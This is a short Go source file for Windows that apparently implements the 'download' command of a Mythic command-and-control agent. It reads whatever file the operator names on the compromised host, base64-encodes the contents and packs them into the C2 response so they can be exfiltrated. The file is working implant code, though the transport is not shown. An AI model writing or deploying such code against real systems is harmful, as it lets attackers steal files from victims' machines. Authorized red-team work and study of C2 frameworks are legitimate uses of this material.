//go:build windows
// +build windows

package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
)

type DownloadParams struct {
	Path string `json:"path"`
	FileID string `json:"file_id"`
}

func cmdDownload(raw json.RawMessage, resp *MythicResponse) string {
	var p DownloadParams
	if err := json.Unmarshal(raw, &p); err != nil {
		return "error: " + err.Error()
	}

	data, err := os.ReadFile(p.Path)
	if err != nil {
		return "error: " + err.Error()
	}

	resp.TotalChunks = 1
	resp.ChunkNum = 1
	resp.ChunkData = base64.StdEncoding.EncodeToString(data)
	resp.FullPath = p.Path

	return fmt.Sprintf("downloaded %s (%d bytes)", p.Path, len(data))
}
